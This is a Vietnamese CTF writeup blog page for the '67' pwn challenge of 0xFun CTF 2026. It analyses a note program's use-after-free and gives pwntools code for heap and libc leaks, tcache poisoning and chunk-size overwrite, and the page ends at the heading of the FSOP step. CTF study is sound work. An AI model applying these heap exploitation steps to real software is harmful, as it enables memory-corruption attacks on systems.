<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Writeup: 0xFun CTF 2026 | H00d1eBl4ck</title><meta name="author" content="H00d1eBl4ck"><meta name="copyright" content="H00d1eBl4ck"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Pwn | 67Phân tích challenge Checksec:  12RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILEFull RELRO">
<meta property="og:type" content="article">
<meta property="og:title" content="Writeup: 0xFun CTF 2026">
<meta property="og:url" content="https://elliotbigfan.github.io/2026/02/16/2025/ctf/0xfun/wu/index.html">
<meta property="og:site_name" content="H00d1eBl4ck">
<meta property="og:description" content="Pwn | 67Phân tích challenge Checksec:  12RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILEFull RELRO">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://elliotbigfan.github.io/img/ctf/0xfun/poster.png">
<meta property="article:published_time" content="2026-02-16T02:32:18.000Z">
<meta property="article:modified_time" content="2026-02-16T04:16:36.255Z">
<meta property="article:author" content="H00d1eBl4ck">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://elliotbigfan.github.io/img/ctf/0xfun/poster.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Writeup: 0xFun CTF 2026",
  "url": "https://elliotbigfan.github.io/2026/02/16/2025/ctf/0xfun/wu/",
  "image": "https://elliotbigfan.github.io/img/ctf/0xfun/poster.png",
  "datePublished": "2026-02-16T02:32:18.000Z",
  "dateModified": "2026-02-16T04:16:36.255Z",
  "author": [
    {
      "@type": "Person",
      "name": "H00d1eBl4ck",
      "url": "https://elliotbigfan.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon_io/favicon.ico"><link rel="canonical" href="https://elliotbigfan.github.io/2026/02/16/2025/ctf/0xfun/wu/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Writeup: 0xFun CTF 2026',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/ctf/0xfun/poster.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/favicon_io/favicon.ico" alt="Logo"><span class="site-name">H00d1eBl4ck</span></a><a class="nav-page-title" href="/"><span class="site-name">Writeup: 0xFun CTF 2026</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Writeup: 0xFun CTF 2026</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-02-16T02:32:18.000Z" title="Created 2026-02-16 09:32:18">2026-02-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-16T04:16:36.255Z" title="Updated 2026-02-16 11:16:36">2026-02-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/0xFun-CTF/">0xFun CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>13mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Pwn-67"><a href="#Pwn-67" class="headerlink" title="Pwn | 67"></a>Pwn | 67</h1><h2 id="Phan-tich-challenge"><a href="#Phan-tich-challenge" class="headerlink" title="Phân tích challenge"></a>Phân tích challenge</h2><ul>
<li><strong>Checksec</strong>:</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   RW-RUNPATH   <span class="number">57</span> Symbols        No    <span class="number">0</span>               <span class="number">2</span>               chall_patched</span><br></pre></td></tr></table></figure>

<p>–&gt; Gần như các cơ chế security đều đã được bật.</p>
<ul>
<li><strong>File chall:</strong></li>
<li>Hàm <code>main</code>:</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = get_int();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">5</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_14:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid option&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">          edit_note();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          read_note();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          create_note();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          delete_note();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>–&gt; Có xuất hiện các hàm liên quan đến thao tác với note, đây có thể sẽ là một bài liên quan đến heap exploitation.</p>
<ul>
<li>Hàm <code>create_note</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> idx; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  idx = get_int();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)idx &lt; <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    v2 = get_int();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">1024</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_QWORD *)&amp;notes + idx) = <span class="built_in">malloc</span>(v2);</span><br><span class="line">      sizes[idx] = v2;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Data: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;notes + idx), v2);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Note created!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Hàm <code>delete_note</code>:</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v1 = get_int();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &lt;= <span class="number">9</span> &amp;&amp; *((_QWORD *)&amp;notes + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;notes + v1));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note deleted!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Hàm <code>read_note</code>:</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">read_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v1 = get_int();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &lt;= <span class="number">9</span> &amp;&amp; *((_QWORD *)&amp;notes + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data: &quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>, *((<span class="type">const</span> <span class="type">void</span> **)&amp;notes + v1), (<span class="type">int</span>)sizes[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_2094);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Hàm <code>edit_note</code>:</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v1 = get_int();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &lt;= <span class="number">9</span> &amp;&amp; *((_QWORD *)&amp;notes + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;New Data: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;notes + v1), (<span class="type">int</span>)sizes[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note updated!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>–&gt; Ở hàm <code>create_note</code> cho phép tạo note với kích thước tối đa là 1024 (0x400) vì vậy ta không thể nhập kích thước 1040 (0x410) để khiến việc free note làm tràn sang <code>unsorted_bin</code> nhằm leak được địa chỉ libc. Tuy nhiên, ta hoàn toàn có thể tận dụng UAF bug để có thể đọc ghi vào metadata của heap chunk nhằm thay đổi kích thước của chunk thành 0x410 và khi free ta có thể leak được libc.</p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p><strong>1. Leak địa chỉ heap base và xác định địa chỉ chunk size của heap note 0</strong></p>
<ul>
<li>Tận dụng bug UAF ta hoàn toàn leak được địa chỉ heap base:<ul>
<li>Mã giả:</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="string">b&#x27;0&#x27;</span>, <span class="string">b&#x27;1024&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">read(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\x00&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">info(<span class="string">f&#x27;Heap base: <span class="subst">&#123;<span class="built_in">hex</span>(heap_base)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">heap_size0 = heap_base + <span class="number">0x300</span></span><br><span class="line">info(<span class="string">f&#x27;Heap size0: <span class="subst">&#123;<span class="built_in">hex</span>(heap_size0)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Lưu ý: Ta cần chọn địa chỉ heap mà có thể chia hết cho 16 để không bị báo lỗi khi malloc: “malloc(): unaligned tcache chunk detected”, nên địa chỉ heap_size0 mình thật sự đã lấy offset đúng trừ cho 0x8 rồi để tí nhập thì nhập thêm b’\x00’ * 8 là được.</p>
</blockquote>
<p><strong>2. Chỉnh sửa chunk size của note 0 thành 0x421 (đã tính thêm size của metadata là 0x11)</strong></p>
<ul>
<li>Tận dụng UAF ta hoàn toàn có thể thực hiện được bước này:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="string">b&#x27;0&#x27;</span>, <span class="string">b&#x27;1024&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">create(<span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;1024&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">create(<span class="string">b&#x27;2&#x27;</span>, <span class="string">b&#x27;1024&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="string">b&#x27;2&#x27;</span>, p64(heap_size0 ^ heap_base &gt;&gt; <span class="number">12</span>))</span><br><span class="line">create(<span class="string">B&#x27;3&#x27;</span>, <span class="string">b&#x27;1024&#x27;</span>, <span class="string">b&#x27;C&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">create(<span class="string">b&#x27;4&#x27;</span>, <span class="string">b&#x27;1024&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x421</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>3. Căn chỉnh lại heap note sau note 0 để tránh lỗi khi free note 0</strong></p>
<ul>
<li><p>Sau khi chỉnh sửa chunk size của note 0 thì sẽ khiến phần note sau nó bị hỏng, ta cần chỉnh sửa lại để tránh lỗi khi free note 0 (<code>double free or corruption (!prev)</code>).</p>
</li>
<li><p>Debug file chall local:</p>
</li>
</ul>
<p><img src="/img/ctf/0xfun/img1.png" alt="debug"></p>
<ul>
<li><p>Từ ảnh trên ta có thể thấy size của note 0 đã lớn hơn và lấn sang cả heap size của note 1 và làm kích thước note 1 nhỏ đi, bây giờ ta cần edit lại note này bằng <strong>size ban đầu của note 1 là (0x411 (1024) bytes) trừ cho phần đã giảm đi (16 bytes) sẽ ra được 0x401</strong>.</p>
</li>
<li><p>Kế tiếp chỉ cần free note 0 và read là có được địa chỉ libc.</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, p8(<span class="number">0</span>) * <span class="number">8</span> + p64(<span class="number">0x401</span>)) <span class="comment"># 0x401 : 1024</span></span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">read(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">libc_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = libc_leak - <span class="number">0x1e7b20</span></span><br><span class="line">info(<span class="string">f&#x27;Libc leak: <span class="subst">&#123;<span class="built_in">hex</span>(libc_leak)&#125;</span>&#x27;</span>)</span><br><span class="line">info(<span class="string">f&#x27;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>4. Tận dụng UAF để ghi vào <em>IO_2_1_stdout</em> (FSOP) khi đã có libc</strong></p>
